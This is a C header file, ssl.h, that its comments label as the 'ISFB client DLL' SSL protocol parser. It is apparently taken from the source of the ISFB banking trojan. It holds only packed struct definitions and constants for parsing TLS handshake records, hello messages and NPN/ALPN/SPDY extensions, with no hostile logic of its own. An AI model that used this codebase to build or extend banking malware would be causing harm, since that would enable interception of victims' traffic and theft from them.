//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: ssl.h
// $Revision: 56 $
// $Date: 2013-04-24 19:29:31 +0400 (—р, 24 апр 2013) $
// description:
//	ISFB client DLL. SSL protocol parser.

#pragma once

#pragma pack(push)
#pragma pack(1)

typedef struct _TLS_DATA1
{
	UCHAR	Length;
	UCHAR	Data[];
} TLS_DATA1, *PTLS_DATA1;

typedef struct _TLS_DATA2
{
	USHORT	Length;
	USHORT	Data[];
} TLS_DATA2, *PTLS_DATA2;

typedef struct _NPN_STRING
{
	UCHAR	Length;
	UCHAR	Data[];
} NPN_STRING, *PNPN_STRING;

typedef	struct _TLS_EXTENSION
{
	USHORT	Type;
	USHORT	Length;
	UCHAR	Data[];
} TLS_EXTENSION, *PTLS_EXTENSION;

typedef	struct	_TLS_SERVER_HELLO
{
	USHORT			Version;
	ULONG			Time;
	UCHAR			RandomBytes[28];
	UCHAR			SessionIdLength;
	USHORT			CipherSuite;
	UCHAR			CompressionMethod;
	USHORT			ExtensionLength;
	UCHAR			Extensions[];
} TLS_SERVER_HELLO, *PTLS_SERVER_HELLO;

typedef struct _TLS_CLIENT_HELLO
{
	USHORT			Version;
	ULONG			Time;
	UCHAR			RandomBytes[28];
	TLS_DATA1		SessionId;
} TLS_CLIENT_HELLO, *PTLS_CLIENT_HELLO;

typedef struct _TLS_MESSAGE
{
	UCHAR	Type;
	UCHAR	LengthHi;
	USHORT	Length;
	UCHAR	Data[];
} TLS_MESSAGE, *PTLS_MESSAGE;

typedef struct _TLS_RECORD
{
	CHAR			ContentType;
	USHORT			Version;
	USHORT			Length;
	PCHAR			Data[];
} TLS_RECORD, *PTLS_RECORD;

#pragma pack(pop)


#define	TLS_MAX_VERSION			0x303
#define	TLS_HANDSHAKE			22
#define	TLS_MSG_CLIENT_HELLO	1
#define	TLS_MSG_SERVER_HELLO	2
#define	TLS_EXT_NPN				0x3374
#define	TLS_EXT_ALPN			0x10

#define	uSPDY					'ydps'
